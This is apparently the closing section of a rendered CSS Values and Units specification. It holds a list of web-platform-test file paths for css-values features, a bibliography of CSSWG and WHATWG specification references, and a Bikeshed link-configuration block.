- `css/css-values/chrome-interpolation-crash.html`
- `css/css-values/chrome-typed-arithmetic-crash.html`
- `css/css-values/clamp-color-computed.html`
- `css/css-values/clamp-color-invalid.html`
- `css/css-values/clamp-integer-computed.html`
- `css/css-values/clamp-integer-invalid.html`
- `css/css-values/clamp-length-computed.html`
- `css/css-values/clamp-length-invalid.html`
- `css/css-values/clamp-length-serialize.html`
- `css/css-values/clamp-none-whitespace.html`
- `css/css-values/crashtests/calc-with-percent-and-number-in-line-height.html`
- `css/css-values/crashtests/chrome-405422528-crash.html`
- `css/css-values/crashtests/chrome-bug-492735384.html`
- `css/css-values/crashtests/chrome-bug-493952652.html`
- `css/css-values/crashtests/viewport-unit-inline-style-crash.html`
- `css/css-values/dynamic-viewport-units-rule-cache.html`
- `css/css-values/ex-calc-expression-001.html`
- `css/css-values/ex-unit-001.html`
- `css/css-values/ex-unit-002.html`
- `css/css-values/ex-unit-003.html`
- `css/css-values/ex-unit-004.html`
- `css/css-values/exp-log-compute.html`
- `css/css-values/exp-log-invalid.html`
- `css/css-values/exp-log-serialize.html`
- `css/css-values/getComputedStyle-border-radius-001.html`
- `css/css-values/getComputedStyle-border-radius-002.html`
- `css/css-values/getComputedStyle-border-radius-003.html`
- `css/css-values/getComputedStyle-calc-mixed-units-001.html`
- `css/css-values/getComputedStyle-calc-mixed-units-002.html`
- `css/css-values/getComputedStyle-calc-mixed-units-003.html`
- `css/css-values/hypot-pow-sqrt-computed.html`
- `css/css-values/hypot-pow-sqrt-invalid.html`
- `css/css-values/hypot-pow-sqrt-serialize.html`
- `css/css-values/ic-unit-001.html`
- `css/css-values/ic-unit-002.html`
- `css/css-values/ic-unit-003.html`
- `css/css-values/ic-unit-004.html`
- `css/css-values/ic-unit-008.html`
- `css/css-values/ic-unit-009.html`
- `css/css-values/ic-unit-010.html`
- `css/css-values/ic-unit-011.html`
- `css/css-values/ic-unit-012.html`
- `css/css-values/ic-unit-013.html`
- `css/css-values/ic-unit-014.html`
- `css/css-values/ic-unit-015.html`
- `css/css-values/ic-unit-016.html`
- `css/css-values/integer_interpolation_round_half_001.html`
- `css/css-values/integer_interpolation_round_half_002.html`
- `css/css-values/integer_interpolation_round_half_towards_positive_infinity_order.html`
- `css/css-values/integer_interpolation_round_half_towards_positive_infinity_z_index.html`
- `css/css-values/lh-rlh-on-root-001.html`
- `css/css-values/lh-rlh-percentage-line-height-with-zoom.html`
- `css/css-values/lh-unit-001.html`
- `css/css-values/lh-unit-002.html`
- `css/css-values/lh-unit-003.html`
- `css/css-values/lh-unit-004.html`
- `css/css-values/lh-unit-005.html`
- `css/css-values/lh-unit-same-element-font-size-dependency.html`
- `css/css-values/lh-unit-same-element-line-height-dependency.html`
- `css/css-values/line-break-ch-unit.html`
- `css/css-values/max-20-arguments.html`
- `css/css-values/max-function-crash.html`
- `css/css-values/max-length-percent-001.html`
- `css/css-values/max-unitless-zero-invalid.html`
- `css/css-values/min-length-percent-001.html`
- `css/css-values/min-max-percentage-length-interpolation.html`
- `css/css-values/minmax-angle-computed.html`
- `css/css-values/minmax-angle-invalid.html`
- `css/css-values/minmax-angle-serialize.html`
- `css/css-values/minmax-integer-computed.html`
- `css/css-values/minmax-length-computed.html`
- `css/css-values/minmax-length-invalid.html`
- `css/css-values/minmax-length-percent-computed.html`
- `css/css-values/minmax-length-percent-invalid.html`
- `css/css-values/minmax-length-percent-serialize.html`
- `css/css-values/minmax-length-serialize.html`
- `css/css-values/minmax-number-computed.html`
- `css/css-values/minmax-number-invalid.html`
- `css/css-values/minmax-number-serialize.html`
- `css/css-values/minmax-percentage-computed.html`
- `css/css-values/minmax-percentage-invalid.html`
- `css/css-values/minmax-percentage-serialize.html`
- `css/css-values/minmax-time-computed.html`
- `css/css-values/minmax-time-invalid.html`
- `css/css-values/minmax-time-serialize.html`
- `css/css-values/mod-length-degrees-crash.html`
- `css/css-values/negative-calc-to-non-negative-integer.html`
- `css/css-values/percentage-rem-low.html`
- `css/css-values/percentage-without-context.html`
- `css/css-values/premature-comment-crash.html`
- `css/css-values/q-unit-case-insensitivity-001.html`
- `css/css-values/q-unit-case-insensitivity-002.html`
- `css/css-values/rcap-invalidation.html`
- `css/css-values/rch-invalidation.html`
- `css/css-values/rem-length-degrees-crash.html`
- `css/css-values/rem-root-font-size-restyle-1.html`
- `css/css-values/rem-unit-root-element.html`
- `css/css-values/resolution-with-percentage-without-context.html`
- `css/css-values/rex-invalidation.html`
- `css/css-values/rgba-011.html`
- `css/css-values/ric-invalidation.html`
- `css/css-values/rlh-invalidation.html`
- `css/css-values/rlh-on-root-lengths.html`
- `css/css-values/rlh-unit-001.html`
- `css/css-values/round-function.html`
- `css/css-values/round-length-degrees-crash.html`
- `css/css-values/round-mod-rem-computed.html`
- `css/css-values/round-mod-rem-invalid.html`
- `css/css-values/round-mod-rem-serialize.html`
- `css/css-values/sign-in-keyframes-with-relative-units.html`
- `css/css-values/signed-zero.html`
- `css/css-values/signs-abs-computed.html`
- `css/css-values/signs-abs-invalid.html`
- `css/css-values/signs-abs-serialize.html`
- `css/css-values/sin-cos-tan-computed.html`
- `css/css-values/sin-cos-tan-invalid.html`
- `css/css-values/sin-cos-tan-serialize.html`
- `css/css-values/svg-attr-case-sensitivity.html`
- `css/css-values/typed-arithmetic-different-categories-crash.html`
- `css/css-values/typed-arithmetic-inside-calc-crash.html`
- `css/css-values/typed-arithmetic-mixed-units-crash.html`
- `css/css-values/typed_arithmetic.html`
- `css/css-values/typed_arithmetic_cycle.html`
- `css/css-values/update-subpixel-rem-unit.html`
- `css/css-values/using-font-relative-units-in-font-properties.html`
- `css/css-values/various-values-important.html`
- `css/css-values/vh-calc-support-pct.html`
- `css/css-values/vh-calc-support.html`
- `css/css-values/vh-em-inherit.html`
- `css/css-values/vh-inherit.html`
- `css/css-values/vh-interpolate-pct.html`
- `css/css-values/vh-interpolate-px.html`
- `css/css-values/vh-interpolate-vh.html`
- `css/css-values/vh-support-margin.html`
- `css/css-values/vh-support-transform-origin.html`
- `css/css-values/vh-support-transform-translate.html`
- `css/css-values/vh-support.html`
- `css/css-values/vh-update-and-transition-in-subframe.html`
- `css/css-values/vh-zero-support.html`
- `css/css-values/viewport-page-print.html`
- `css/css-values/viewport-relative-lengths-scaled-viewport.html`
- `css/css-values/viewport-unit-011.html`
- `css/css-values/viewport-units-001-print.html`
- `css/css-values/viewport-units-after-font-load.html`
- `css/css-values/viewport-units-compute.html`
- `css/css-values/viewport-units-css2-001.html`
- `css/css-values/viewport-units-extreme-scale.html`
- `css/css-values/viewport-units-gutter-001.html`
- `css/css-values/viewport-units-gutter-002.html`
- `css/css-values/viewport-units-gutter-003.html`
- `css/css-values/viewport-units-gutter-004.html`
- `css/css-values/viewport-units-gutter-005.html`
- `css/css-values/viewport-units-gutter-006.html`
- `css/css-values/viewport-units-gutter-007.html`
- `css/css-values/viewport-units-gutter-008.html`
- `css/css-values/viewport-units-invalidation.html`
- `css/css-values/viewport-units-keyframes.html`
- `css/css-values/viewport-units-media-queries.html`
- `css/css-values/viewport-units-modify.html`
- `css/css-values/viewport-units-parsing.html`
- `css/css-values/viewport-units-scrollbars-auto-vhw-001.html`
- `css/css-values/viewport-units-scrollbars-compute.html`
- `css/css-values/viewport-units-scrollbars-crash.html`
- `css/css-values/viewport-units-scrollbars-custom-001.html`
- `css/css-values/viewport-units-scrollbars-dynamic-001.html`
- `css/css-values/viewport-units-scrollbars-mq-001.html`
- `css/css-values/viewport-units-scrollbars-root-properties-001.html`
- `css/css-values/viewport-units-scrollbars-scroll-vhw-001.html`
- `css/css-values/viewport-units-scrollbars-scroll-vw-001.html`
- `css/css-values/viewport-units-scrollbars-scroll-vw-002.html`
- `css/css-values/viewport-units-scrollbars-scroll-vw-003.html`
- `css/css-values/viewport-units-writing-mode-font-size.html`
- `css/css-values/viewport-units-writing-mode.html`

## <a id="references"></a>References

Generated bibliography: these reference descriptions and external auto-links were resolved using Bikeshed 7.1.3’s bundled data; they are not a historical capture of the linked specifications.

### <a id="normative"></a>Normative References

<a id="biblio-css-align-3"></a>\[CSS-ALIGN-3\]  
Elika Etemad; Tab Atkins Jr.. [CSS Box Alignment Module Level 3](https://drafts.csswg.org/css-align/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-align&#x2F;](https://drafts.csswg.org/css-align/)

<a id="biblio-css-animations-1"></a>\[CSS-ANIMATIONS-1\]  
David Baron; et al. [CSS Animations Level 1](https://drafts.csswg.org/css-animations/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-animations&#x2F;](https://drafts.csswg.org/css-animations/)

<a id="biblio-css-animations-2"></a>\[CSS-ANIMATIONS-2\]  
David Baron; Brian Birtles. [CSS Animations Level 2](https://drafts.csswg.org/css-animations-2/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-animations-2&#x2F;](https://drafts.csswg.org/css-animations-2/)

<a id="biblio-css-backgrounds-3"></a>\[CSS-BACKGROUNDS-3\]  
Elika Etemad; Brad Kemper. [CSS Backgrounds and Borders Module Level 3](https://drafts.csswg.org/css-backgrounds/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-backgrounds&#x2F;](https://drafts.csswg.org/css-backgrounds/)

<a id="biblio-css-cascade-5"></a>\[CSS-CASCADE-5\]  
Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 5](https://drafts.csswg.org/css-cascade-5/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-cascade-5&#x2F;](https://drafts.csswg.org/css-cascade-5/)

<a id="biblio-css-cascade-6"></a>\[CSS-CASCADE-6\]  
Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 6](https://drafts.csswg.org/css-cascade-6/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-cascade-6&#x2F;](https://drafts.csswg.org/css-cascade-6/)

<a id="biblio-css-color-5"></a>\[CSS-COLOR-5\]  
Chris Lilley; Una Kravets; Lea Verou. [CSS Color Module Level 5](https://drafts.csswg.org/css-color-5/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-color-5&#x2F;](https://drafts.csswg.org/css-color-5/)

<a id="biblio-css-conditional-3"></a>\[CSS-CONDITIONAL-3\]  
Chris Lilley; David Baron; Elika Etemad. [CSS Conditional Rules Module Level 3](https://drafts.csswg.org/css-conditional-3/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-conditional-3&#x2F;](https://drafts.csswg.org/css-conditional-3/)

<a id="biblio-css-conditional-5"></a>\[CSS-CONDITIONAL-5\]  
Chris Lilley; et al. [CSS Conditional Rules Module Level 5](https://drafts.csswg.org/css-conditional-5/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-conditional-5&#x2F;](https://drafts.csswg.org/css-conditional-5/)

<a id="biblio-css-display-3"></a>\[CSS-DISPLAY-3\]  
Tab Atkins Jr.; Elika Etemad. [CSS Display Module Level 3](https://drafts.csswg.org/css-display/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-display&#x2F;](https://drafts.csswg.org/css-display/)

<a id="biblio-css-easing-2"></a>\[CSS-EASING-2\]  
[CSS Easing Functions Level 2](https://drafts.csswg.org/css-easing/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-easing&#x2F;](https://drafts.csswg.org/css-easing/)

<a id="biblio-css-fonts-4"></a>\[CSS-FONTS-4\]  
Chris Lilley. [CSS Fonts Module Level 4](https://drafts.csswg.org/css-fonts-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-fonts-4&#x2F;](https://drafts.csswg.org/css-fonts-4/)

<a id="biblio-css-images-3"></a>\[CSS-IMAGES-3\]  
Tab Atkins Jr.; Elika Etemad; Lea Verou. [CSS Images Module Level 3](https://drafts.csswg.org/css-images-3/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-images-3&#x2F;](https://drafts.csswg.org/css-images-3/)

<a id="biblio-css-images-4"></a>\[CSS-IMAGES-4\]  
Elika Etemad; Tab Atkins Jr.; Lea Verou. [CSS Images Module Level 4](https://drafts.csswg.org/css-images-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-images-4&#x2F;](https://drafts.csswg.org/css-images-4/)

<a id="biblio-css-mixins-1"></a>\[CSS-MIXINS-1\]  
Tab Atkins Jr.; Miriam Suzanne. [CSS Functions and Mixins Module](https://drafts.csswg.org/css-mixins/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-mixins&#x2F;](https://drafts.csswg.org/css-mixins/)

<a id="biblio-css-properties-values-api-1"></a>\[CSS-PROPERTIES-VALUES-API-1\]  
Tab Atkins Jr.; Alan Stearns; Greg Whitworth. [CSS Properties and Values API Level 1](https://drafts.css-houdini.org/css-properties-values-api-1/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;css-houdini&#x2E;org&#x2F;css-properties-values-api-1&#x2F;](https://drafts.css-houdini.org/css-properties-values-api-1/)

<a id="biblio-css-pseudo-4"></a>\[CSS-PSEUDO-4\]  
Elika Etemad; Alan Stearns. [CSS Pseudo-Elements Module Level 4](https://drafts.csswg.org/css-pseudo-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-pseudo-4&#x2F;](https://drafts.csswg.org/css-pseudo-4/)

<a id="biblio-css-shadow-1"></a>\[CSS-SHADOW-1\]  
[CSS Shadow Module Level 1](https://drafts.csswg.org/css-shadow-1/). Editor's Draft. URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-shadow-1&#x2F;](https://drafts.csswg.org/css-shadow-1/)

<a id="biblio-css-sizing-3"></a>\[CSS-SIZING-3\]  
Tab Atkins Jr.; Elika Etemad. [CSS Box Sizing Module Level 3](https://drafts.csswg.org/css-sizing-3/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-sizing-3&#x2F;](https://drafts.csswg.org/css-sizing-3/)

<a id="biblio-css-sizing-4"></a>\[CSS-SIZING-4\]  
Tab Atkins Jr.; Elika Etemad; Jen Simmons. [CSS Box Sizing Module Level 4](https://drafts.csswg.org/css-sizing-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-sizing-4&#x2F;](https://drafts.csswg.org/css-sizing-4/)

<a id="biblio-css-syntax-3"></a>\[CSS-SYNTAX-3\]  
Tab Atkins Jr.; Simon Sapin. [CSS Syntax Module Level 3](https://drafts.csswg.org/css-syntax/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-syntax&#x2F;](https://drafts.csswg.org/css-syntax/)

<a id="biblio-css-transforms-1"></a>\[CSS-TRANSFORMS-1\]  
Simon Fraser; et al. [CSS Transforms Module Level 1](https://drafts.csswg.org/css-transforms/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-transforms&#x2F;](https://drafts.csswg.org/css-transforms/)

<a id="biblio-css-transforms-2"></a>\[CSS-TRANSFORMS-2\]  
Tab Atkins Jr.; et al. [CSS Transforms Module Level 2](https://drafts.csswg.org/css-transforms-2/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-transforms-2&#x2F;](https://drafts.csswg.org/css-transforms-2/)

<a id="biblio-css-transitions-1"></a>\[CSS-TRANSITIONS-1\]  
Chris Marrin; et al. [CSS Transitions Module Level 1](https://drafts.csswg.org/css-transitions/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-transitions&#x2F;](https://drafts.csswg.org/css-transitions/)

<a id="biblio-css-typed-om-1"></a>\[CSS-TYPED-OM-1\]  
Tab Atkins Jr.; François Remy. [CSS Typed OM Level 1](https://drafts.css-houdini.org/css-typed-om-1/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;css-houdini&#x2E;org&#x2F;css-typed-om-1&#x2F;](https://drafts.css-houdini.org/css-typed-om-1/)

<a id="biblio-css-values-4"></a>\[CSS-VALUES-4\]  
Tab Atkins Jr.; Elika Etemad. [CSS Values and Units Module Level 4](https://drafts.csswg.org/css-values-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-values-4&#x2F;](https://drafts.csswg.org/css-values-4/)

<a id="biblio-css-values-5"></a>\[CSS-VALUES-5\]  
Tab Atkins Jr.; Elika Etemad; Miriam Suzanne. [CSS Values and Units Module Level 5](https://drafts.csswg.org/css-values-5/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-values-5&#x2F;](https://drafts.csswg.org/css-values-5/)

<a id="biblio-css-variables-2"></a>\[CSS-VARIABLES-2\]  
[CSS Custom Properties for Cascading Variables Module Level 2](https://drafts.csswg.org/css-variables-2/). Editor's Draft. URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-variables-2&#x2F;](https://drafts.csswg.org/css-variables-2/)

<a id="biblio-css-writing-modes-4"></a>\[CSS-WRITING-MODES-4\]  
Elika Etemad; Koji Ishii. [CSS Writing Modes Level 4](https://drafts.csswg.org/css-writing-modes-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-writing-modes-4&#x2F;](https://drafts.csswg.org/css-writing-modes-4/)

<a id="biblio-css21"></a>\[CSS21\]  
Bert Bos; et al. [Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification](https://drafts.csswg.org/css2/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css2&#x2F;](https://drafts.csswg.org/css2/)

<a id="biblio-cssom-1"></a>\[CSSOM-1\]  
Daniel Glazman; Emilio Cobos Álvarez. [CSS Object Model (CSSOM)](https://drafts.csswg.org/cssom/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;cssom&#x2F;](https://drafts.csswg.org/cssom/)

<a id="biblio-dom"></a>\[DOM\]  
Anne van Kesteren. [DOM Standard](https://dom.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;dom&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://dom.spec.whatwg.org/)

<a id="biblio-fetch"></a>\[FETCH\]  
Anne van Kesteren. [Fetch Standard](https://fetch.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;fetch&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://fetch.spec.whatwg.org/)

<a id="biblio-html"></a>\[HTML\]  
Anne van Kesteren; et al. [HTML Standard](https://html.spec.whatwg.org/multipage/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;html&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;multipage&#x2F;](https://html.spec.whatwg.org/multipage/)

<a id="biblio-infra"></a>\[INFRA\]  
Anne van Kesteren; Domenic Denicola. [Infra Standard](https://infra.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;infra&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://infra.spec.whatwg.org/)

<a id="biblio-mediaqueries-5"></a>\[MEDIAQUERIES-5\]  
Tab Atkins Jr.; et al. [Media Queries Level 5](https://drafts.csswg.org/mediaqueries-5/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;mediaqueries-5&#x2F;](https://drafts.csswg.org/mediaqueries-5/)

<a id="biblio-referrer-policy"></a>\[REFERRER-POLICY\]  
Jochen Eisinger; Emily Stark. [Referrer Policy](https://w3c.github.io/webappsec-referrer-policy/). URL: [https&#x3A;&#x2F;&#x2F;w3c&#x2E;github&#x2E;io&#x2F;webappsec-referrer-policy&#x2F;](https://w3c.github.io/webappsec-referrer-policy/)

<a id="biblio-selectors-3"></a>\[SELECTORS-3\]  
Tantek Çelik; et al. [Selectors Level 3](https://drafts.csswg.org/selectors-3/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;selectors-3&#x2F;](https://drafts.csswg.org/selectors-3/)

<a id="biblio-selectors-4"></a>\[SELECTORS-4\]  
Elika Etemad; Tab Atkins Jr.. [Selectors Level 4](https://drafts.csswg.org/selectors/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;selectors&#x2F;](https://drafts.csswg.org/selectors/)

<a id="biblio-web-animations-1"></a>\[WEB-ANIMATIONS-1\]  
Brian Birtles; et al. [Web Animations](https://drafts.csswg.org/web-animations-1/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;web-animations-1&#x2F;](https://drafts.csswg.org/web-animations-1/)

<a id="biblio-web-animations-2"></a>\[WEB-ANIMATIONS-2\]  
Brian Birtles; Robert Flack. [Web Animations Module Level 2](https://drafts.csswg.org/web-animations-2/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;web-animations-2&#x2F;](https://drafts.csswg.org/web-animations-2/)

<a id="biblio-webidl"></a>\[WEBIDL\]  
Edgar Chen; Timothy Gu. [Web IDL Standard](https://webidl.spec.whatwg.org/). Living Standard. URL: [https&#x3A;&#x2F;&#x2F;webidl&#x2E;spec&#x2E;whatwg&#x2E;org&#x2F;](https://webidl.spec.whatwg.org/)

### <a id="informative"></a>Non-Normative References

<a id="biblio-css-box-4"></a>\[CSS-BOX-4\]  
Elika Etemad. [CSS Box Model Module Level 4](https://drafts.csswg.org/css-box-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-box-4&#x2F;](https://drafts.csswg.org/css-box-4/)

<a id="biblio-css-cascade-4"></a>\[CSS-CASCADE-4\]  
Elika Etemad; Tab Atkins Jr.. [CSS Cascading and Inheritance Level 4](https://drafts.csswg.org/css-cascade-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-cascade-4&#x2F;](https://drafts.csswg.org/css-cascade-4/)

<a id="biblio-css-color-4"></a>\[CSS-COLOR-4\]  
Tab Atkins Jr.; Chris Lilley; Lea Verou. [CSS Color Module Level 4](https://drafts.csswg.org/css-color-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-color-4&#x2F;](https://drafts.csswg.org/css-color-4/)

<a id="biblio-css-display-4"></a>\[CSS-DISPLAY-4\]  
Elika Etemad; Tab Atkins Jr.. [CSS Display Module Level 4](https://drafts.csswg.org/css-display-4/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-display-4&#x2F;](https://drafts.csswg.org/css-display-4/)

<a id="biblio-css-lists-3"></a>\[CSS-LISTS-3\]  
Elika Etemad; Tab Atkins Jr.. [CSS Lists and Counters Module Level 3](https://drafts.csswg.org/css-lists-3/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-lists-3&#x2F;](https://drafts.csswg.org/css-lists-3/)

<a id="biblio-css-variables"></a>\[CSS-VARIABLES\]  
Tab Atkins Jr.. [CSS Custom Properties for Cascading Variables Module Level 1](https://drafts.csswg.org/css-variables/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;css-variables&#x2F;](https://drafts.csswg.org/css-variables/)

<a id="biblio-scroll-animations-1"></a>\[SCROLL-ANIMATIONS-1\]  
Brian Birtles; et al. [Scroll-driven Animations](https://drafts.csswg.org/scroll-animations-1/). URL: [https&#x3A;&#x2F;&#x2F;drafts&#x2E;csswg&#x2E;org&#x2F;scroll-animations-1&#x2F;](https://drafts.csswg.org/scroll-animations-1/)

## <a id="source-linking-configuration"></a>Source linking configuration

Compiler configuration recorded in the pinned source; retained for provenance.

```text
spec:css-color-4; type:property; text:color
spec:css-values-4; type: dfn;
	text: determine the type of a calculation
	text: keyword
	text: identifier
spec:selectors-4; type: dfn; text: selector
spec:css-conditional-5;
	type:type;
		text:<size-feature>
		text:<container-name>
		text:<style-query>
	type:dfn; text:container feature
	type:at-rule; text:@container
spec:css-mixins-1; type:dfn; text:custom function
spec:css-properties-values-api; type:dfn; text: supported syntax component names
spec:html; type:element; text:link
spec:infra; type:dfn;
	text:list
	text:user agent
```